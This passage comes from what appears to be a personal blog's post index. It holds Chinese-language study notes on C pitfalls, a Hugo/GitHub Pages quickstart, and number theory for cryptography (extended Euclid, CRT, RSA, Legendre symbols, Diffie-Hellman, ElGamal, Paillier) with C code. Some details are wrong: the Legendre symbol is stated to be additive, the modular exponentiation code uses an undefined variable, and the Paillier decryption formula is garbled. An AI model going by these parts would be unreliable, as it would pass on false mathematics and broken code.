printf(\u0026#34;%llu\u0026#34;,strlen(a)); return 0; } 字符串和数组一样有多种声明方式. 以长度声明字符串时, 需注意留一位给末尾的\u0026quot;NULL\u0026rdquo;. 动态长度字符串同数组, 同时使用\u0026quot;memset()\u0026ldquo;函数初始化. 若用\u0026quot;strlen()\u0026ldquo;得到其他字符串输出时, 想要得到相同有效长度的字符串需要声明长度为\u0026quot;strlen(string)+1\u0026rdquo;. 尽管不以\u0026quot;NULL\u0026quot;结尾有时不会得到错误的输出, 但应当避免不规范的使用. 仅以字符串值声明字符串时, 编译器会默认在结尾添加\u0026quot;NULL\u0026rdquo;, 无论字符串值末尾是否有\u0026quot;\\0\u0026quot;.\n1 2 3 4 5 int main(){ char str[] = \u0026#34;C is the best language!\\0\u0026#34;; // 此处打断点调试, 发现字符串长度为25, 但有效字符只有23个, 最后两个均为\u0026#34;NULL\u0026#34;. return 0; } 逻辑短路 对于逻辑运算符与\u0026quot;\u0026amp;\u0026amp;\u0026ldquo;和或\u0026rdquo;||\u0026ldquo;存在短路规则, \u0026ldquo;\u0026amp;\u0026amp;\u0026ldquo;前若已为假则忽略后续直接返回\u0026quot;fasle\u0026rdquo;, 同理\u0026rdquo;||\u0026ldquo;前若已为真则忽略后续直接返回\u0026quot;true\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 0, b = 1, c = 10, f, t; f = a \u0026amp;\u0026amp; (b - ++c); t = b || (a - c++); printf(\u0026#34;%d\\n\u0026#34;,c); f = b \u0026amp;\u0026amp; (a - ++c); t = a || (b - c++); printf(\u0026#34;%d\\n\u0026#34;,c); return 0; } 运算优先级上, \u0026ldquo;()\u0026ldquo;和\u0026rdquo;++\u0026ldquo;都高于\u0026rdquo;\u0026amp;\u0026amp;\u0026ldquo;和\u0026rdquo;||\u0026rdquo;, 但第一次f和t赋值中有副作用的\u0026rdquo;++\u0026ldquo;一次也没有被执行, 第二次中都被执行了.\n内存溢出和内存泄漏 内存溢出指申请空间没有足够的空间可以使用, 如声明\u0026quot;int\u0026quot;类型变量, 但赋值了超出\u0026quot;int\u0026quot;类型的数.\n内存泄漏指申请使用内存后, 无法释放已经申请的内存空间; 内存泄漏累积就会造成内存溢出. (在某些优化较差的游戏中, 如刺客信条: 大革命, 游玩时会突然卡死, 打开任务管理器发现内存占用率100%, 可能就是遇到了内存泄漏问题.) 对于个人用户, 内存泄漏也许不严重, 结束程序进程时会释放所有已分配的内存; 但对于服务器, 某些程序需要一直保持运行, 内存泄漏会不断累积并造成严重后果.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // 比较低级的错误: 分配的内存使用完后没有释放 // 指针重新赋值时, 原指向位置丢失 int *p = (int *)malloc(sizeof(int)); int *np = (int *)malloc(sizeof(int)); p = np; // 内存释放时, 造成位置孤立 head -\u0026gt; next = node; free(head); // 分配了没有指针指向的内存 int *memory(){ return (int *)malloc(sizeof(int)); } void lost(){ memory(); } 防止内存泄漏的核心思想是: 进行任何内存有关的操作时, 始终确保每个已分配的内存都有指针指向.\n待更新内容: 聚合体与字节序, 副作用, 按位运算妙用, 宏函数, 变长参数, 线程\n","date":"2023-09-16T00:00:00Z","permalink":"https://example.com/p/c%E6%9D%82%E8%B0%88/","title":"C杂谈"},{"content":"PREPARATION git download hugo download Check git \u0026amp; hugo added in the environment variables (Windows).\nThe following steps are in Bash.\n1 2 git version hugo version ON PREMISES 1 2 3 4 5 6 hugo new site blog cd blog git clone https://themeName themes/themeName cp themes/themeName/exampleSite/* ./ -r rm hugo.toml hugo server FIRST COMMIT Github Create Repositoriy: username.github.io\n1 2 3 4 5 6 7 hugo cd public git init git remote add origin https://github.com/username/username.github.io.git git add . git commit -m \u0026#34;first commit\u0026#34; git push -u origin master LATER COMMIT 1 2 3 4 5 6 hugo cd public git add . git status git commit -m \u0026#34;add blog post\u0026#34; git push KATEX CONFUSION display obsidian hugo newline \\\\ \\\\\\ % \\% \\\\% suffix { }_ { }\\_ * * \\* { \\{ \\\\{ ","date":"2023-09-14T00:00:00Z","permalink":"https://example.com/p/hugo%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","title":"hugo快速入门"},{"content":"(C11 - GCC8.1.0)\n整除 性质: $c|a$, $c|b \\Longrightarrow$ $c|ax+by$, $\\forall x,y\\in\\mathbb{Z}$. 最大公因数: ${\\rm gcd}(a,b)=\\inf_{\\geq 0}\\{sa+tb|s,t\\in\\mathbb{Z}\\}$.\n辗转相除求${\\rm gcd}$: $$\\begin{align} \u0026amp;a=q_1b+r_1\\\\ \u0026amp;b=q_2r_1+r_2\\\\ \u0026amp;\u0026hellip;\\\\ \u0026amp;r_{n-2}=q_nr_{n-1}+r_n \\end{align}$$ 当 $r_n=0$ 时, 有 $r_{n-1}={\\rm gcd}(a,b)$.\n对序列中被除数与除数从$1$开始编号, 进而有递归: $$\\begin{align} \u0026amp;a_i=(a_i/b_i)b_i+(a_i\\%b_i)\\\\ \u0026amp;a_i=b_{i-1}\\\\ \u0026amp;b_i=a_{i-1}\\%b_{i-1} \\end{align}$$ 并约定 ${\\rm gcd}(a,0)=a$.\n1 2 3 int gcd(int a, int b){ return b==0? a : gcd(b,a%b); } Bezout定理: 给定 $a,b\\in\\mathbb{Z}$, Diophantine方程 $ax+by=m$ 有解 $\\Longleftrightarrow$ ${\\rm gcd}(a,b)|m$.\n可仅考查 $m={\\rm gcd}(a,b)$, 不然, 结果只需乘相应倍数. 在递归中, 显然有 ${\\rm gcd}(a,b)={\\rm gcd}(a_i,b_i)$, 即 $\\exists x_i,y_i\\in\\mathbb{Z}$ s.t. $a_ix_i+b_iy_i=m$. $$\\begin{align} m\u0026amp;=a_ix_i+b_iy_i\\\\ \u0026amp;=b_{i-1}x_i+(a_{i-1}\\%b_{i-1})y_i\\\\ \u0026amp;=b_{i-1}x_i+[a_{i-1}-(a_{i-1}/b_{i-1})b_{i-1}]y_i\\\\ \u0026amp;=y_ia_{i-1}+[x_i-(a_{i-1}/b_{i-1})y_i]b_{i-1}\\\\ \u0026amp;=x_{i-1}a_{i-1}+y_{i-1}b_{i-1} \\end{align}$$\n1 2 3 4 5 6 7 8 9 10 11 12 13 int extEuclid(int a, int b, int* x, int* y){ if (b==0){ *x = 1; *y = 0; return a; } else { int tempX,tempY; int gcd = extEuclid(b,a%b,\u0026amp;tempX,\u0026amp;tempY); *y = tempX-(a/b)*tempY; *x = tempY; return gcd; } } 而使用CPP元组写法上更优雅些:\n1 2 3 4 5 6 7 8 9 tuple\u0026lt;int,int,int\u0026gt;extEuclidCpp(int a, int b){ if (b==0){ return make_tuple(a,1,0); } else { int x,y,gcd; tie(x,y,gcd) = extEuclidCpp(b,a%b); return make_tuple(gcd,y,x-(a/b)*y); } } 定理: 素数 $p$ 及 $a,b\\in\\mathbb{Z}$, 若 $p|ab$ 则 $p|a$ 或 $p|b$.\n设 $p\\nmid a$ 且 $p\\nmid b$, 则 $\\exists x,y$ s.t. $xp+ya=1$, 故 $x(ab)+(by)p=b$, 有 $p|b$, 矛盾.\n唯一分解: $\\forall n\\in\\mathbb{Z}$, $n=\\prod p_i^{k_i}$, $p_i$ 为不同素数, $k_i\\in\\mathbb{Z}_+$, 形式唯一.\n同余 性质: $\\forall m\\in\\mathbb{Z}_+$, $a\\equiv b({\\rm mod}\\ m) \\Longleftrightarrow m|a-b$.\n$a\\equiv b({\\rm mod}\\ m)$, $c\\equiv d({\\rm mod}\\ m) \\Longrightarrow a+c\\equiv b+d({\\rm mod}\\ m)$, $ac\\equiv bd({\\rm mod}\\ m)$, $a^n\\equiv b^n({\\rm mod}\\ m)$. $ak\\equiv bk({\\rm mod}\\ m) \\Longrightarrow a\\equiv b({\\rm mod}\\ \\frac{m}{{\\rm gcd}(m,k)})$. 模 $m$ 剩余类: $\\mathbb{Z}/m\\mathbb{Z}$. 最小非负完全剩余系: $\\mathbb{Z}_m=\\{0,1\u0026hellip;,m-1\\}$, 显然 $\\forall x\\neq y\\in\\mathbb{Z}_m$ s.t. $x\\not\\equiv y({\\rm mod}\\ m)$. 既约剩余系: $\\mathbb{Z}_m^*=\\{a\\in\\mathbb{Z}_m|{\\rm gcd}(a,m)=1\\}$.\nEuler $\\varphi$ 函数: $$m=\\prod_{i=1}^r p_i^{k_i}, |\\mathbb{Z}_m^*|=\\varphi(m)=\\prod_{i=1}^r p_i^{k_i-1}(p_i-1)=m\\prod_{p|m}(1-\\frac{1}{p})$$\n当 $m=p$ 为素数时, 有 $\\varphi(p)=p-1$; $\\mathbb{Z}_p^*=\\{1,2,\u0026hellip;,p-1\\}$ 为循环群, 生成元个数为$\\varphi(p-1)$.\n考察函数性质:\n若素数 $p|n$, 则 $\\varphi(pn)=p\\varphi(n)$; 若素数 $p\\nmid n$, 则 $\\varphi(pn)=(p-1)\\varphi(n)$; 若 ${\\rm gcd}(m,n)=1$, 则 $\\varphi(m,n)=\\varphi(m)\\varphi(n)$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int phi[n+1], prime[n+1]; bool isSieved[n+1]; // O(n), 每个数均只遍历一次 void phiEuler(int n){ int count = 1; prime[0] = 1; phi[1] = 1; for (int i = 2; i \u0026lt; n; ++i){ if (!isSieved[i]){ prime[count++] = i; phi[i] = i-1; } for (int j = 1; i*prime[j] \u0026lt;= n; ++j){ int comp = i*prime[j]; isSieved[comp] = 1; if (i%prime[j] == 0){ phi[comp] = prime[j]*phi[i]; break; } else { phi[comp] = (prime[j]-1)*phi[i]; } } } } 定理: 若 ${\\rm \\gcd}(a,m)=1$, $x$ 遍历 $\\mathbb{Z}_m^*$, 则 $ax$ 也遍历$\\mathbb{Z}_m^*$.\n考虑 ${\\rm gcd}(ax,m)=1$ 及 $ax_i\\not\\equiv ax_j({\\rm mod}\\ m)$, $i\\neq j$.\n逆元: 若 ${\\rm gcd}(a,m)=1$, 则 $\\exists ! x\\in\\mathbb{Z}_m^*$ s.t. $ax\\equiv 1({\\rm mod}\\ m)$. Euler: 若 ${\\rm gcd}(a,m)=1$, 则 $a^{\\varphi(m)}\\equiv 1({\\rm mod}\\ m)$.\n$\\mathbb{Z}_m^*=\\{x_1,\u0026hellip;,x_{\\varphi(m)}\\}=\\{ax_1,\u0026hellip;,a_{\\varphi(m)}\\}$, 故 $\\prod x_i\\equiv\\prod ax_i({\\rm mod}\\ m)$, 已知 ${\\rm gcd}(x_i,m)=1$, 得 $m|a^{\\varphi(m)}-1$.\n特别 $m=p$ 为素数时, Fermat: 若 $p\\nmid a$, 则 $a^{p-1}\\equiv 1({\\rm mod}\\ p)$, 有 $a^{-1}\\equiv a^{p-2}({\\rm mod}\\ p)$. 由扩展Euclid, ${\\rm gcd}(a,m)=1$, $\\exists s,t\\in\\mathbb{Z}$ s.t. $as+tm=1$, 即 $a^{-1}\\equiv s({\\rm mod}\\ m)$.\n1 2 3 4 5 6 7 8 9 int inverse(int a, int m){ int s,t; int gcd = extEuclid(a,m,\u0026amp;s,\u0026amp;t); if (gcd == 1){ return s; } else { return 0; } } wilson: 素数 $p$ 有 $(p-1)!\\equiv -1({\\rm mod}\\ p)$.\n$\\mathbb{Z}_m^*$ 中元素均存在逆, 自逆仅 $1,p-1$; $\\{2,3,\u0026hellip;,p-2\\}$ 中两两配对互逆.\n1 2 3 4 5 6 7 bool wilson(int p){ int factMod = 1; for (int i = p-1; i \u0026gt;= 1; --i){ factMod = (factMod*i)%p; } return (factMod+1)%p == 0; } 仿射: ${\\rm gcd}(a,26)=1$, 密钥对数量 $26\\varphi(26)-1=311$.\n加密 $c=E_{a,b}(m)=am+b({\\rm mod}\\ 26)$. 解密 $m=D_{a,b}(c)=a^{-1}(c-b)({\\rm mod}\\ 26)$. 同余式 同余式 $f(x)\\equiv a_nx^n+\u0026hellip;+a_1x+a_0({\\rm mod}\\ m)$, $a_i\\in\\mathbb{z}$, $m\\in\\mathbb{Z}_+$. 同余方程 $f(x)\\equiv 0({\\rm mod}\\ m)$ 至多有 $m$ 个解(剩余类).\n一次同余 $ax\\equiv b({\\rm mod}\\ m)$, $a,b\\in\\mathbb{Z}$, $m\\in\\mathbb{Z}_+$ 有解 $\\iff {\\rm gcd}(a,m)|b$.\n$ax\\equiv b({\\rm mod}\\ m)$ 在 ${\\rm gcd}(a,m)=1$ 时有唯一解 $x\\equiv a^{-1}b({\\rm mod}\\ m)$. 记 $d={\\rm gcd}(a,m)$, 有 $\\frac{a}{d}x\\equiv \\frac{b}{d}({\\rm mod}\\ \\frac{m}{d})$, 即 $x=\\frac{b}{d}(\\frac{a}{d})^{-1}+k\\frac{m}{d}$, $k\\in\\mathbb{Z}$. 考虑 $k=qd+r$, $q,r\\in\\mathbb{Z}$, $0\\leq r\u0026lt; d$, $x=[\\frac{b}{d}(\\frac{a}{d})^{-1}({\\rm mod}\\frac{m}{d})+r\\frac{m}{d}]({\\rm mod\\ m})$.\n求解步骤:\n扩展Euclid求 $d={\\rm gcd}(a,m)$, 记 $sa+tm=d$; $b\\%d=0$ 判断有无解; 设 $b\u0026rsquo;=b/d$, $m\u0026rsquo;=m/d$, $s\u0026rsquo;\\equiv s({\\rm mod}\\ m\u0026rsquo;)$; 得 $x\\equiv s\u0026rsquo;b\u0026rsquo;+rm\u0026rsquo;\\ ({\\rm mod}\\ m)$, $r=0,1,\u0026hellip;,d-1$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 int linearCongEq (int a, int b, int m, int ansX[]){ a %= m; b %= m; int s,t; int origM = m; int d = extEuclid(a,m,\u0026amp;s,\u0026amp;t); if (b%d == 0){ b /= d; m /= d; s %= m; for (int r = 0; r \u0026lt;= d-1; ++r){ ansX[r] = ((s*b+r*m)%(origM)+origM)%origM; } return d; } else { return 0; } } 一次同余组(CRT): $m_{i{1\\leq i \\leq k}}$ 两两互素, 同余组 $x\\equiv a_i({\\rm mod\\ m_i})_{{1\\leq i\\leq k}}$ 有唯一解 $x=\\sum M_i M_i^{-1} a_i \\ ({\\rm mod}\\ m)$. 其中, $m=\\prod m_i$, $M_i=m/m_i$, $M_i^{-1}$ 为模 $m_i$ 上的逆.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 long crt (int a[],int m[],int n){ int modSepM[n]; int modIevM[n]; long modM[n]; long prodM = 1; long x = 0; for (int i = 0; i \u0026lt; n; ++i){ prodM *= m[i]*1L; } for (int i = 0; i \u0026lt; n; ++i){ modM[i] = 1L*prodM/m[i]; modSepM[i] = (1L*modM[i])%m[i]; modIevM[i] = inverse(modSepM[i],m[i]); if (!modIevM[i]){ return 0; } } for (int i = 0; i \u0026lt; n; ++i) { x = (x+1L*modIevM[i]*modM[i]*a[i])%prodM; } x = (x+prodM)%prodM; return x; } RSA: 素数$p,q$, $n=pq$, ${\\rm gcd}(e,\\varphi(n))=1$, $\\varphi(n)=(p-1)(q-1)$.\n公钥 $(e,n)$, 加密 $c=E_{e,n}(m)\\equiv m^e({\\rm mod}\\ n)$. 私钥$d\\equiv e^{-1}({\\rm mod}\\ \\varphi(n))$, 解密 $m=D_{d,n}(m)\\equiv c^d({\\rm mod}\\ n)$. 快速模幂 $r\\equiv t^e({\\rm mod}\\ n)$ 1 2 3 4 5 6 7 8 9 10 11 int fastPowerMod (int t, int ex, int n){ int r = 1; while (ex){ if (ex\u0026amp;1){ r = (1LL*r*t)%modular; } t = (1LL*t*t)%modular; ex \u0026gt;\u0026gt;= 1; } return r; } 二次剩余 $ax^2+bx+c\\equiv 0({\\rm mod}\\ m)$ 总能简化为 $x^2\\equiv d({\\rm mod}\\ q^k)$, $q$ 为素数, $a,b,c,d,m,k\\in\\mathbb{Z}_+$. 仅考虑 $x^2\\equiv a({\\rm mod}\\ q)$, ${\\rm gcd}(a,p)=1$, $a\\in\\mathbb{Z}$ 为模素数 $q$ 的二次剩余.\nEuler: ${\\rm gcd}(a,p)=1$, $p$ 为奇素数, $a\\in\\mathbb{Z}$:\n模 $p$ 的二次剩余恰有 $\\frac{p-1}{2}$ 个. $a$ 为模 $p$ 二次剩余 $\\iff a^{\\frac{p-1}{2}}\\equiv 1({\\rm mod}\\ p)$, 此时 $x^2\\equiv a({\\rm mod}\\ p)$ 有二解. $a$ 为模 $p$ 二次非剩余 $\\iff a^{\\frac{p-1}{2}}\\equiv -1({\\rm mod}\\ p)$. 显然 $i^2\\equiv(p-i)^2({\\rm mod}\\ p)$; 若 $j^2\\equiv i^2({\\rm mod}\\ p)$, $1\\leq i\u0026lt;j\u0026lt;\\frac{p}{2}$, 则 $p|j-i$ 或 $p|j+i$, 但 $j+i\u0026lt;p$, 矛盾.\n$a$ 为模 $p$ 二次剩余时, $\\exists x_0\\in\\mathbb{Z}$, ${\\rm gcd}(x_0,p)=1$, $x_0^2\\equiv a({\\rm mod}\\ p)$, 故 $a^{\\frac{p-1}{2}}\\equiv x_0^{p-1}\\equiv 1({\\rm mod}\\ p)$.\n$a$ 为模 $p$ 二次非剩余时, 考虑 $a^{p-1}\\equiv 1({\\rm mod}\\ p)$, 则 $p|{\\frac{p-1}{2}}-1$ 或 $p|{\\frac{p-1}{2}}+1$, 但 $x^{\\frac{p-1}{2}}\\equiv 1({\\rm mod}\\ p)$ 的全部解恰为全部的二次剩余.\nLegendre: $(\\frac{a}{p})=a^{\\frac{p-1}{2}}\\%p=1\\ {\\rm or}\\ -1\\ {\\rm or}\\ 0$, $p$ 为素数, $a\\in\\mathbb{Z}$.\n$$ (\\frac{1}{p}) = 1;\\ (\\frac{ab}{p})=(\\frac{a}{p})(\\frac{b}{p}); \\ (\\frac{a+b}{p})=(\\frac{a}{p})+(\\frac{b}{p})$$\n$$(\\frac{a^2}{p})=1,\\ {\\rm gcd}(a,p)=1$$\n$$ (\\frac{-1}{p})=\\begin{cases} \u0026amp;1,\\ \u0026amp;p\\%4=1\\\\ \u0026amp;-1,\\ \u0026amp;p\\%4=3 \\end{cases}$$\n$$ (\\frac{2}{p})=\\begin{cases} \u0026amp;1,\\ \u0026amp;p\\%8=1,7\\\\ \u0026amp;-1,\\ \u0026amp;p\\%8=3,5 \\end{cases}$$\n二次互反: $(\\frac{p}{q})(\\frac{q}{p})=(-1)^{\\frac{p-1}{2}\\frac{q-1}{2}}$, $p\\ne q$ 为奇素数.\nGuass: 奇素数 $p$, $a\\in\\mathbb{Z}$, ${\\rm gcd}(a,p)=1$, 设 $M_{a,p}=\\{ka\\%p, \\ k=1,2,\u0026hellip;,\\frac{p-1}{2}\\ |\\ ka\\%p\u0026gt;\\frac{p}{2}\\}$, 记 $m(a,p)=|M_{a,p}|$, 则 $(\\frac{a}{p})=(-1)^{m(a,p)}$.\n设 $K=\\{ka\\%p\\ |\\ k=1,2,\u0026hellip;,\\frac{p-1}{2}\\}$, $b_i\\in M$, $c_j\\in M-K$, $i=1,2,..,m(a,p)$, $j=1,2,\u0026hellip;,\\frac{p-1}{2}-m(a,p)$.\n显然有 $c_j\\ne p-b_i$, $\\forall i,j$; 否则 $p|b_i+c_j$, 即 $\\exists x,y\\in\\mathbb{Z}$, $x,y\u0026lt;\\frac{p}{2}$ s.t. $p|a(x+y)$, 但 $x+y\u0026lt;p$, 矛盾.\n故 $a^{\\frac{p-1}{2}}(\\frac{p-1}{2})!\\equiv\\prod c_j \\prod (p-b_i)\\equiv (-1)^{m(a,p)}(\\frac{p-1}{2})!({\\rm mod}\\ p)$.\nEisenstein: $a$ 为奇数时, 记$e(a,p)=\\sum\\lfloor\\frac{ka}{p}\\rfloor$, 有 $e(a,p)\\equiv m(a,p)({\\rm mod}\\ 2)$.\n不妨设 $ka=d_kp+r_k$, $0\\leq r_k\\leq p-1$, $d_k,r_k\\in\\mathbb{Z}$, 有 $p\\sum d_k+\\sum r_k=\\sum ka = \\sum c_j+\\sum (p-b_i)$, 故 $\\sum d_k\\equiv m(a,p)({\\rm mod}\\ 2)$; 显然 $e(a,p)=\\sum d_k$.\n$q\\ne p$ 为奇素数时, $\\not\\exists x,y\\in\\mathbb{Z}$, $x,y\u0026lt;\\frac{p}{2}$ s.t. $xp=qy$, 即 $e(p,q)+e(q,p)=\\frac{p-1}{2}\\frac{q-1}{2}$.\n$a=2$ 时, $\\lfloor\\frac{p}{4}\\rfloor\\leq k\\leq \\lfloor\\frac{p}{2}\\rfloor$, 有 $m=\\lfloor\\frac{p}{2}\\rfloor-\\lfloor\\frac{p}{4}\\rfloor$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int fastLegendre(int a, int p){ int s; int e = 0; if (a == 0 || a == 1){ return a; } else { while (a%2 == 0){ a /= 2; ++e; } if (e%2 == 0 || p%8 == 1 || p%8 == 7){ s = 1; } else { s = -1; } if (p%4 == 3 \u0026amp;\u0026amp; a%4 == 3){ s = -s; } if (a == 1){ return s; } else { return s*fastLegendre(p%a,a); } } } Rabin: 素数 $p\\equiv q\\equiv 3({\\rm mod}\\ 4)$.\n公钥 $n=pq$, 加密 $c\\equiv E_{n}(m)\\equiv m^2({\\rm mod}\\ n)$. 私钥 $(p,q)$, 解密 $m\\equiv D_{p,q}(c)\\equiv \\pm c^{\\frac{p+1}{4}}({\\rm mod}\\ p)\\equiv \\pm c^{\\frac{q+1}{4}}({\\rm mod}\\ q)\\ (2\\ {\\rm in}\\ 4)$. 原根 原根: $a,m\\in\\mathbb{Z}$, $m\u0026gt;1$, ${\\rm gcd}(a,m)=1$, 记 ${\\rm ord}_m(a)=\\inf\\{x\\in\\mathbb{Z}_+\\ | \\ a^x\\equiv 1({\\rm mod}\\ m)\\}$ 称为 $a$ 对模 $m$ 的阶; 特别, ${\\rm ord}_m(a)=\\varphi(m)$ 时称 $a$ 为模 $m$ 的原根.\n定理: $a,m\\in\\mathbb{Z}$, $m\u0026gt;1$, ${\\rm gcd}(a,m)=1$, 则 $a^n\\equiv 1({rm mod}\\ m)\\iff {\\rm ord}_m(a)|n$. 特别, ${\\rm ord}_m(a)|\\varphi(m)$.\n定理: $g$ 为模 $m$ 原根 $\\iff g^{\\frac{\\varphi(m)}{p_i}}\\not\\equiv 1({\\rm mod}\\ m)$, $\\forall$ 素数 $p_i|\\varphi(m)$.\n必要性: 显然.\n充分性: 若 $\\exists e\u0026lt;\\varphi(m)$ s.t. $g^e\\equiv 1({\\rm mod}\\ m)$; 不妨设 $\\frac{\\varphi(m)}{e}=kp$, $k\\in\\mathbb{Z}$, $p$ 为素数; 进而 $g^{\\frac{\\varphi(m)}{e}\\equiv(g^p)^k\\equiv 1({\\rm mod}\\ m)}$, 矛盾.\n定理: $a,m,d\\in\\mathbb{Z}_+$, ${\\rm gcd}(a,m)=1$, ${\\rm ord}_m(a^d)=\\frac{{\\rm ord}_m(a)}{{\\rm gcd}({\\rm ord}_m(a),d)}$. 推论: 模 $m$ 存在原根时, 有 $\\varphi(\\varphi(m))$ 个原根; 同时原根为模 $m$ 上本原多项式的全部解. 以下显然:\n${\\rm ord}_m(a)={\\rm ord}_m(a^{-1})$. $b\\equiv a({\\rm mod}\\ m)$, 则 ${\\rm ord}_m(b)={\\rm ord}_m(a)$. ${\\rm gcd}(a,m)=1$, $a^0,a^1,\u0026hellip;,a^{{\\rm ord}_m(a)-1}$ 两两模 $m$ 不同余. 特别, $g$ 为模 $m$ 原根时, 恰好有 $\\mathbb{Z}_p^*={g^0,g^1,\u0026hellip;,g^{\\varphi(g)-1}}$. $g$ 为模 $m$ 原根时, $x,y\\in\\mathbb{Z}$, $g^x\\equiv g^y({\\rm mod}\\ m) \\iff x\\equiv y({\\rm mod}\\ \\varphi(m))$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 bool nMod1(int a, int n, int p, int* primeFact){ int num = 0, r; while(primeFact[num]){ r = fastPowerMod(a,n/primeFact[num],p); if (r == 1){ break; } else { ++num; } if(!primeFact[num]) { return true; } } return false; } int minPrimeRoot(int p){ int n = p-1, res = 0; int primeFact[10] = {0}; factPrime(n,primeFact); for (int i = 2; i \u0026lt;= p/2; ++i) { if (nMod1(i,n,p,primeFact)){ res = i; break; } } return res; } D-H协议: 大素数 $p$ 和模 $p$ 原根 $g$, 任选 $2\\leq x,y\\leq p-1$.\n公钥 $(p,g)$, 私钥 $x,y$. 握手: $k_{X\\to Y}\\equiv g^x({\\rm mod}\\ p)$, $k_{Y\\to X}\\equiv g^y({\\rm mod}\\ p)$. 密钥: $k\\equiv k_{Y\\to X}^x\\equiv k_{X\\to Y}^y \\equiv g^{xy}({\\rm mod}\\ p)$. ElGamal: 大素数 $p$ 和模 $p$ 原根 $g$, 任选 $2\\leq a\\leq p-1$, $Y_a\\equiv g^a({\\rm mod}\\ p)$.\n公钥 $(p,g,Y_a)$, 加密 $u\\equiv g^k({\\rm mod}\\ p)$, $v\\equiv mY_a^k({\\rm mod}\\ p)$, $c=E_{p,g,Y_a,k}(m)=(u,v)$, 任选 $2\\leq k\\leq p-1$. 私钥 $a$, 解密 $m\\equiv D_a(c)\\equiv \\frac{v}{u^a}({\\rm mod}\\ p)$. 群 有限群: 非空有限集 $G$ 上代数运算满足结合律, 存在单位元(记 $e$), 逆元(记 $a^{-1}$); 记 $|G|={\\rm Card}(G)$ 为阶; 定义 $a^{-n}=(a^{-1})^n$, $a^0=e$.\n半群: 只满足结合律. 幺半群: 存在单位元的半群. 交换半群: 满足交换律的半群. 交换幺半群: 存在单位元满足交换律的半群. Abel群: 满足交换律的群. 消去律: 可由结合律和逆元推得.\n元素的阶: $|a|=\\inf \\{n\\in\\mathbb{N}_+\\ |\\ a^n = e\\}$ 或 $\\infty$; $|a^{-1}|=|a|$, $|a^d|=\\frac{|a|}{{\\rm gcd}(|a|,d)}$; 若 $n\\in\\mathbb{Z}$, $a^n=e$ 则 $|a||n$.\n子群: 群 $G$ 的非空子集 $H$ 关于 $G$ 的代数运算构成群, 记 $H\u0026lt;G$; 真子群即非平凡子群({e},G); $H\u0026lt;G$ 则 $e\\in H$, $e\\in G$, 且 $\\forall a\\in H$, $a^{-1}\\in G$; $H\u0026lt;G \\iff \\forall a,b\\in H$, $ab^{-1}\\in H$.\n循环群: 群 $G$ 的非空子集 $S$, 生成子群 $\\langle S\\rangle=\\bigcap_{S\\subset H\u0026lt;G}H=\\{\\prod a_i^{l_i}\\ |\\ a_i\\in S, l_i=\\pm 1\\}$; 特别 $S=\\{a\\}$ 时, 循环子群 $\\langle S\\rangle=\\langle a\\rangle=\\{a^n\\ |\\ n\\in\\mathbb{Z}\\}$; 特别 $G=\\langle a\\rangle$ 时为循环群 $\\iff\\exists a\\in G$ s.t. $|a|=|G|$; 循环群子群仍为循环群; 无限循环群同构于 $\\mathbb{Z}$, $n$ 阶循环群同构于 $\\mathbb{Z}_n$.\n不妨设 $H\u0026lt;G=\\langle a\\rangle$, $H\\ne {e}$, $\\exists a^k\\in H$, $a^{-k}\\in H$, 则 $\\exists r,t\\in\\mathbb{Z}_+$, $q\\in\\mathbb{Z}$ s.t. $a^r\\in H$, $n=qr+t$; 进而 $a^n=a^{qr+t}\\in H$ 即 $t=0$, 故 $H\\subset \\langle a^r\\rangle$.\n陪集: $H\u0026lt;G$, $\\forall a\\in G$, $aH$ 为左陪集; $a\\in aH$, $aH=H\\iff a\\in H$, $aH=bH$ 或 $aH\\cap bH=\\empty$, $|H|=|aH|$; $G=\\bigcup_{g\\in G}gH$.\nLagrange: 记 $[G:H]=\\frac{|G|}{|H|}$, $|G|=[G:H]|H|$; $|a|||G|$.\n正规子群: $H\u0026lt;G$, $\\forall a\\in G$, $aH=Ha$, 记 $H\\lhd G$; $H\u0026lt;G$, $\\forall a\\in G$, $H\\lhd G \\iff aHa^{-1}=H \\iff aHa^{-1} \\subset H \\iff aha^{-1}\\in H$, $\\forall h\\in H$.\n商群: $H\\lhd G$, $G/H=\\{aH\\ |\\ a\\in G\\}$, $aH\\ast bH=(ab)H$.\n同态: 保持代数运算不变的映射, 双射时为同构. 群同态: 群 $G_1,G_2$, 映射 $f:G_1\\to G_2$, $f(ab)=f(a)f(b)$, $\\forall a,b\\in G_1$.\n同态 Paillier: 素数 $p,q$, $n=pq$, $\\lambda = {\\rm lcm}(p-1)(q-1)$ 最小公倍数, $g\\in\\mathbb{Z}_{n^2}^*$ s.t. ${\\rm gcd} (\\frac{g^\\lambda \\% n^2 -1}{n},n)=1$.\n公钥 $(n,g)$, 加密 $c\\equiv E_{n,g}(m)\\equiv g^m r^n({\\rm mod}\\ n^2)$, $r\\in\\mathbb{Z}_n^*$. 私钥 $\\lambda$, 解密 $m\\equiv D_\\lambda(c)\\equiv\\frac{c^\\lambda \\%n-1}{g^\\lambda \\\u0026amp;n-1}({\\rm mod}\\ n^2)$. 加法同态: $m_1+m_2=D_\\lambda[E_{n,g}(m_1)E_{n,g}(m_2)]$. 置换群: 非空集合 $X$ 上所有可逆变换(双射)关于复合构成对称群 $S_x$; $S_x$ 子群称为变换群; 特别 $|X|=n$ 时, 记 $S_x = S_n$, $S_n$及其子群称为置换群, 元素 $\\sigma$ 称为置换; $|S_n|=n!$.\n轮换: $f\\in S_n$, $i_1,\u0026hellip;,i_r\\in X$, $f(i_1)=i_2,\u0026hellip;,f(i_{r-1})=i_r,f(i_r)=i_1$ 且保持其他元素不变时, $f=(i_1,i_2,\u0026hellip;,i_r)$ 称为 $r$ -轮换; 特别 $r=1$ 时为恒等变换, $r=2$ 时称为对换; 任意置换可唯一表示为不相交的轮换之积; 任意轮换可以表示为对换之积.\nCayley: 任意有限群同构于一置换群.\n环和域 环: 非空集合 $R$ 上两个代数运算 $(+,\\cdot)$, $(R,+)$ 为Abel群, $(R,\\cdot)$ 为半群, 